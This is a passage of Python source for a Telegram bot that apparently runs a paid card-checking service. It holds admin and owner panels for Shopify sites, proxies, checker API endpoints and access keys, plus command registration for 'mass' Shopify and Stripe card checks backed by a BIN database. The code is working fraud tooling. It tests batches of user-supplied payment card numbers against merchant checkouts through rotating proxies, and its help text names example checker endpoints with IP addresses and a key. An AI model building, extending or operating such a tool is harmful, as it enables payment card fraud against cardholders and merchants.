        f"<b>{SEP}</b>\n"
        f"⚠️ Sites above this price will be rejected on /addsite.\n"
        f"<b>{SEP}</b>\n"
        f"🗑️ Remove multiple sites:\n"
        f"<code>/rmsite</code>\n<code>url1</code>\n<code>url2</code>\n"
        f"Or reply to a .txt file with <code>/rmsite</code>"),
        [[{"text": "↪️ Back", "callback_data": "admin_panel"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_users"))
async def cb_admin_lu(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    curr = load_premium_users()
    if not curr:
        await event.answer("📋 No users yet.", alert=True); return
    lines = "\n".join(f"  {i+1}. <code>{u}</code>" for i, u in enumerate(curr[:30]))
    extra = f"\n  <i>+{len(curr)-30} more...</i>" if len(curr) > 30 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>📋 Access List ({len(curr)})</b>\n<b>{SEP}</b>\n{lines}{extra}"),
                   [[{"text": "↪️ Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_user_info"))
async def cb_admin_au(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>✅ Add User</b>\n<b>{SEP}</b>\nUsage: <code>/addpremium [id]</code>"),
                   [[{"text": "↪️ Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_rm_user_info"))
async def cb_admin_ru(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>❌ Remove User</b>\n<b>{SEP}</b>\nUsage: <code>/rmpremium [id]</code>"),
                   [[{"text": "↪️ Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_sites_cb"))
async def cb_admin_ls(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    curr = load_sites()
    if not curr:
        await event.answer("🌐 No sites yet.", alert=True); return
    lines = "\n".join(f"  {i+1}. <code>{s}</code>" for i, s in enumerate(curr[:20]))
    extra = f"\n  <i>+{len(curr)-20} more...</i>" if len(curr) > 20 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>🌐 Sites ({len(curr)})</b>\n<b>{SEP}</b>\n{lines}{extra}"),
                   [[{"text": "↪️ Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_site_info"))
async def cb_admin_as(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    max_p = get_max_site_price()
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>✅ Add Site</b>\n<b>{SEP}</b>\n"
                      f"<code>/addsite https://example.com</code>\n"
                      f"Bulk: reply .txt with /addsite\n"
                      f"⚠️ Auto-verified · price must be known · ≤ ${max_p:.2f}"),
                   [[{"text": "↪️ Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_rm_site_info"))
async def cb_admin_rs(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>❌ Remove Site(s)</b>\n<b>{SEP}</b>\n"
                      f"<b>Single:</b>\n<code>/rmsite https://example.com</code>\n"
                      f"<b>Multiple (one per line):</b>\n"
                      f"<code>/rmsite\nhttps://a.com\nhttps://b.com</code>\n"
                      f"<b>Or reply to a .txt file:</b>\n"
                      f"<code>/rmsite</code>"),
                   [[{"text": "↪️ Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_proxy_cb"))
async def cb_admin_lp(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    curr = load_proxies()
    if not curr:
        await event.answer("📡 Proxy pool is empty.", alert=True); return
    lines = "\n".join(f"  {i+1}. <code>{p}</code>" for i, p in enumerate(curr[:20]))
    extra = f"\n  <i>+{len(curr)-20} more...</i>" if len(curr) > 20 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>📡 Proxy Pool ({len(curr)})</b>\n<b>{SEP}</b>\n{lines}{extra}"),
                   [[{"text": "↪️ Back", "callback_data": "admin_proxy_pool"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_proxy_info"))
async def cb_admin_ap(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>✅ Add Proxies (Legacy)</b>\n<b>{SEP}</b>\n"
                      f"⚠️ Pool is NOT used for user checks.\n"
                      f"Users must set own proxies via <code>/setproxy</code>.\n"
                      f"<b>{SEP}</b>\n"
                      f"<code>/addproxy ip:port</code>\n"
                      f"Bulk: reply .txt with /addproxy"),
                   [[{"text": "↪️ Back", "callback_data": "admin_proxy_pool"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_clear_proxy_cb"))
async def cb_admin_cp(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    curr = load_proxies()
    if not curr:
        await event.answer("Proxy pool is already empty.", alert=True); return
    with open(PROXY_FILE, 'w') as f: f.write("")
    await event.answer(f"✅ Cleared {len(curr)} proxies!", alert=True)
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin(event.sender_id))

# ── API endpoints panel ─────────────────────────────────
@bot.on(events.CallbackQuery(pattern=b"owner_api_eps"))
async def cb_oa(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    d = load_api_endpoints()
    await nav_edit(event.chat_id, event.message_id,
                   _api_endpoints_panel_text(d), rows_owner_api_eps(d))

@bot.on(events.CallbackQuery(pattern=r"^owner_api_set_\d+$"))
async def cb_oa_set(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    idx = int(event.data.decode().rsplit('_', 1)[-1])
    ok, msg, url = set_active_endpoint_by_index(idx)
    if not ok:
        await event.answer(f"❌ {msg}", alert=True); return
    short = url.replace('http://','').replace('https://','')[:40]
    await event.answer(f"✅ Active → {short}", alert=False)
    d = load_api_endpoints()
    await nav_edit(event.chat_id, event.message_id,
                   _api_endpoints_panel_text(d), rows_owner_api_eps(d))

@bot.on(events.CallbackQuery(pattern=b"owner_api_list"))
async def cb_oa_list(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    d = load_api_endpoints()
    eps = d['endpoints']; aidx = d['active_idx']
    lines = []
    for i, ep in enumerate(eps):
        icon = "🟢" if i == aidx else "⚪"
        key_tag = " 🔑" if ep.get('key') else ""
        lines.append(f"  {icon} {i+1}. <code>{ep['url']}</code>{key_tag}")
    text = pe(
        f"<b>🔌 All Endpoints ({len(eps)})</b>\n<b>{SEP}</b>\n" +
        ("\n".join(lines) if lines else "  <i>none</i>")
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text,
                   [[{"text": "↪️ Back", "callback_data": "owner_api_eps"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_api_add_info"))
async def cb_oa_add(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>➕ Add Endpoint</b>\n<b>{SEP}</b>\n"
                      f"<code>/addapi URL</code>\n"
                      f"<code>/addapi URL KEY</code>\n"
                      f"<b>{SEP}</b>\n"
                      f"Examples:\n"
                      f"<code>/addapi http://62.169.23.129:8080/shopii</code>\n"
                      f"<code>/addapi http://5.83.136.102:8136/shopify CHIRAG</code>\n"
                      f"<code>/addapi https://check.yzio.app/shopify</code>\n"
                      f"<b>{SEP}</b>\n"
                      f"⚠️ Key becomes <code>&amp;key=CHIRAG</code> in requests"),
                   [[{"text": "↪️ Back", "callback_data": "owner_api_eps"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_api_rm_info"))
async def cb_oa_rm(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    d = load_api_endpoints()
    eps = d['endpoints']; aidx = d['active_idx']
    lines = []
    for i, ep in enumerate(eps):
        icon = "🟢" if i == aidx else "⚪"
        key_tag = " 🔑" if ep.get('key') else ""
        lines.append(f"  {icon} {i+1}. <code>{ep['url']}</code>{key_tag}")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>❌ Remove Endpoint</b>\n<b>{SEP}</b>\n"
                      + ("\n".join(lines) if lines else "  <i>none</i>")
                      + f"\n<b>{SEP}</b>\n"
                      f"By index: <code>/rmapi 2</code>\n"
                      f"By URL:   <code>/rmapi http://...</code>"),
                   [[{"text": "↪️ Back", "callback_data": "owner_api_eps"}]])

# ── Owner panels ────────────────────────────────────────
@bot.on(events.CallbackQuery(pattern=b"owner_keys"))
async def cb_ok(event):
    if event.sender_id != OWNER_ID:
        await event.answer("❌ Owner only!", alert=True); return
    keys = load_keys(); total = len(keys); used = sum(1 for v in keys.values() if v.get('used'))
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>🔑 Keys</b>\n<b>{SEP}</b>\n"
                      f"Total: {total}\nUsed: {used}\nUnused: {total - used}\n"
                      f"<b>{SEP}</b>\n"
                      f"⚠️ Any admin can generate via <code>/genkey</code>"),
                   rows_owner_keys())

@bot.on(events.CallbackQuery(pattern=b"owner_key_list"))
async def cb_ok_list(event):
    if event.sender_id != OWNER_ID:
        await event.answer("❌ Owner only!", alert=True); return
    keys = list_keys(limit=50)
    if not keys:
        await event.answer("📋 No keys yet.", alert=True); return
    lines = []
    for k, v in keys:
        st = "❌" if v.get('used') else "✅"
        lines.append(f"  {st} <code>{k}</code>  ·  {key_expiry_text(v)}")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>🔑 Keys ({len(keys)})</b>\n<b>{SEP}</b>\n" + "\n".join(lines)),
                   [[{"text": "↪️ Back", "callback_data": "owner_keys"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_key_gen_info"))
async def cb_ok_gen(event):
    if event.sender_id != OWNER_ID:
        await event.answer("❌ Owner only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>✅ Generate Keys</b>\n<b>{SEP}</b>\n"
                      f"<code>/genkey 10 30</code>\n→ 10 keys, valid 30 days\n"
                      f"<code>/genkey 5 0</code> — never expires\n"
                      f"<b>{SEP}</b>\n⚠️ Any admin can use /genkey"),
                   [[{"text": "↪️ Back", "callback_data": "owner_keys"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_gc"))
async def cb_ogc(event):
    if event.sender_id != OWNER_ID:
        await event.answer("❌ Owner only!", alert=True); return
    cfg = load_gc_config()
    def _fmt(v): return f"✅ <code>{v}</code>" if v else "❌ unset"
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>🛡 GC / Channels</b>\n<b>{SEP}</b>\n"
        f"🔒 Private GC:     {_fmt(cfg.get('private_gc'))}\n"
        f"🌐 Public GC:      {_fmt(cfg.get('public_gc'))}\n"
        f"📝 Log GC:         {_fmt(cfg.get('log_gc'))}\n"
        f"📢 Public Channel: {_fmt(cfg.get('public_channel'))}\n"
        f"🔗 Required:       {len(cfg.get('required_channels', []))} channels\n"
        f"<b>{SEP}</b>\n"
        f"<i>Use /set*gc with -100... ID or @username</i>"),
        rows_owner_gc())

@bot.on(events.CallbackQuery(pattern=b"owner_gc_private"))
async def cb_ogc_p(event):
    if event.sender_id != OWNER_ID: return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>🔒 Private GC</b>\n<b>{SEP}</b>\n"
        f"Send in GC:  <code>/setprivategc</code>\n"
        f"Or here:     <code>/setprivategc -100...</code>"),
        [[{"text": "↪️ Back", "callback_data": "owner_gc"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_gc_public"))
async def cb_ogc_pub(event):
    if event.sender_id != OWNER_ID: return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>🌐 Public GC</b>\n<b>{SEP}</b>\n"
        f"Send in GC:  <code>/setpublicgc</code>\n"
        f"Or here:     <code>/setpublicgc -100...</code>"),
        [[{"text": "↪️ Back", "callback_data": "owner_gc"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_gc_log"))
async def cb_ogc_log(event):
    if event.sender_id != OWNER_ID: return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>📝 Log GC</b>\n<b>{SEP}</b>\n"
        f"Send in GC:  <code>/setloggc</code>\n"
        f"Or here:     <code>/setloggc -100...</code>"),
        [[{"text": "↪️ Back", "callback_data": "owner_gc"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_gc_channel"))
async def cb_ogc_ch(event):
    if event.sender_id != OWNER_ID: return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>📢 Public Channel</b>\n<b>{SEP}</b>\n"
        f"Send in channel:  <code>/setpublicchannel</code>\n"
        f"Or here:          <code>/setpublicchannel -100...</code>"),
        [[{"text": "↪️ Back", "callback_data": "owner_gc"}]])

@bot.on(events.CallbackQuery(pattern=b"owner_gc_req"))
async def cb_ogc_req(event):
    if event.sender_id != OWNER_ID: return
    req = load_gc_config()['required_channels']
    lines = "\n".join(f"  • <code>{c}</code>" for c in req) if req else "  <i>none</i>"
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>🔗 Required Channels</b>\n<b>{SEP}</b>\n{lines}\n<b>{SEP}</b>\n"
                      f"<code>/addreqchannel @ch</code>\n"
                      f"<code>/addreqchannel -1001234567890</code>\n"
                      f"<code>/rmreqchannel @ch</code>"),
                   [[{"text": "↪️ Back", "callback_data": "owner_gc"}]])

@bot.on(events.CallbackQuery(pattern=r"^start_check_\d+$"))
async def cb_start_check(event):
    uid = event.sender_id
    data = event.data.decode()
    target = int(data.split('_')[-1])
    if uid != target:
        await event.answer("❌ Not your check!", alert=True); return
    info = pending_checks.pop(uid, None)
    if not info:
        await event.answer("⚠️ Session expired.", alert=True); return
    cards = info['cards']; gate = info.get('gate', 'shopify')
    if gate == 'shopify' and not load_sites():
        await event.answer("❌ No sites available.", alert=True); return
    if not get_user_proxy_list(uid):
        await event.answer("❌ No proxies set. Use /setproxy.", alert=True); return
    await event.answer("🔥 Starting!", alert=False)
    msg_id = await raw_send(uid, pe(
        f"<b>🔥 Mass Check  —  Starting</b>\n<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {len(cards)}\n"
        f"<code>{make_progress_bar(0, len(cards))}</code>"), rows_stop())
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id, gate, 'Shopify'))

@bot.on(events.CallbackQuery(pattern=b"noop"))
async def cb_noop(event): await event.answer()

# ══════════════════════════════════════════════════════════
# Command registration + daily backup
# ══════════════════════════════════════════════════════════
def _register_commands():
    user_cmds = [
        {"command": "start",          "description": "🚀 Open dashboard"},
        {"command": "redeem",         "description": "🔑 Redeem a key"},
        {"command": "sh",             "description": "⚡ Shopify single"},
        {"command": "msh",            "description": "🔥 Shopify mass"},
        {"command": "st1",            "description": "🔥 Stripe $1 single"},
        {"command": "mst1",           "description": "🔥 Stripe $1 mass"},
        {"command": "st5",            "description": "💎 Stripe $5 single"},
        {"command": "mst5",           "description": "💎 Stripe $5 mass"},
        {"command": "auth",           "description": "✅ Stripe Auth2 $0 single"},
        {"command": "mauth",          "description": "✅ Stripe Auth2 $0 mass"},
        {"command": "auth1",          "description": "⚡ Stripe Auth2 v2 single"},
        {"command": "mauth1",         "description": "⚡ Stripe Auth2 v2 mass"},
        {"command": "myplan",         "description": "💎 Your access level"},
        {"command": "setproxy",       "description": "🔌 Set proxy"},
        {"command": "clearuserproxy", "description": "🗑️ Remove proxy"},
        {"command": "chkproxy",       "description": "✅ Test proxy"},
        {"command": "fb",             "description": "📝 Send feedback"},
    ]
    admin_cmds = user_cmds + [
        {"command": "admin",         "description": "👑 Admin panel"},
        {"command": "backup",        "description": "📦 Download backup"},
        {"command": "restore",       "description": "♻️ Restore from .zip"},
        {"command": "addpremium",    "description": "✅ Add user"},
        {"command": "rmpremium",     "description": "❌ Remove user"},
        {"command": "addsite",       "description": "🌐 Add site (or reply .txt)"},
        {"command": "rmsite",        "description": "🗑️ Remove site(s)"},
        {"command": "setsiteprice",  "description": "💰 Set max site price"},
        {"command": "addproxy",      "description": "📡 Add proxy (legacy)"},
        {"command": "clearproxy",    "description": "🗑️ Clear legacy pool"},
        {"command": "chkproxies",    "description": "🔥 Re-test legacy pool"},
        {"command": "addapi",        "description": "🔌 Add API endpoint"},
        {"command": "rmapi",         "description": "❌ Remove API endpoint"},
        {"command": "broadcast",     "description": "📢 Broadcast"},
        {"command": "setadmin",      "description": "👑 Manage admins"},
        {"command": "genkey",        "description": "🔑 Generate keys"},
        {"command": "listkeys",      "description": "📋 List keys"},
    ]
    owner_cmds = admin_cmds + [
        {"command": "addreqchannel",   "description": "🔗 Add required channel"},
        {"command": "rmreqchannel",    "description": "❌ Remove required channel"},
        {"command": "setprivategc",    "description": "🔒 Link private GC"},
        {"command": "setpublicgc",     "description": "🌐 Link public GC"},
        {"command": "setloggc",        "description": "📝 Link log GC"},
        {"command": "setpublicchannel","description": "📢 Link public channel"},
    ]
    from keyboards import _http_session
    base = f"https://api.telegram.org/bot{BOT_TOKEN}"
    try:
        _http_session.post(f"{base}/setMyCommands", json={"commands": user_cmds}, timeout=5)
        _http_session.post(f"{base}/setMyCommands",
                           json={"commands": owner_cmds,
                                 "scope": {"type": "chat", "chat_id": OWNER_ID}}, timeout=5)
        for aid in ADMIN_IDS:
            if aid != OWNER_ID:
                _http_session.post(f"{base}/setMyCommands",
                                   json={"commands": admin_cmds,
                                         "scope": {"type": "chat", "chat_id": aid}}, timeout=5)
    except: pass

_register_commands()
_bin_count = load_bins()
print(f"✅ {BOT_BRAND} started! (BIN DB: {_bin_count:,} entries)")

async def _daily_backup_loop():
    while True:
        try:
            now = datetime.utcnow()
            next_run = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
            wait_secs = (next_run - now).total_seconds()
            print(f"[backup] next in {wait_secs/3600:.1f}h")
            await asyncio.sleep(wait_secs)
            data = create_backup_zip()
            fname = f"backup_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.zip"
            with open(fname, 'wb') as f: f.write(data)
            try:
                msg = await bot.send_file(OWNER_ID, fname,
                                          caption=_backup_caption("Daily Backup"),
                                          parse_mode='html')
                try: await bot.pin_message(OWNER_ID, msg.id, notify=False)
                except Exception as e: print(f"[backup] pin failed: {e}")
            finally:
                try: os.remove(fname)
                except: pass
            print("[backup] daily backup sent")
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[backup] error: {e}")
            await asyncio.sleep(3600)

try:
    loop = bot.loop or asyncio.get_event_loop()
    loop.create_task(_daily_backup_loop())
    print("✅ Daily backup scheduler started (00:00 UTC)")
except Exception as e:
    print(f"⚠️ Scheduler failed: {e}")

bot.run_until_disconnected()
